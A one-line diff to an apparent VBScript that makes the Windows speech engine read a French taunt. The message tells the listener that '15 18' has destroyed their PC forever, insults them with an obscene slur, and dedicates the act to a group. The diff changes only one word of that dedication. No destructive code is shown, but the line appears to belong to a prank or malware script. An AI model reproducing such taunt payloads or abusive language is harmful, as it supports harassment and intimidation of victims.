@@ -1,1 +1,1 @@
-CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 15 18 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux kheys du 15-18."
+CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 15 18 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiye du 15-18."
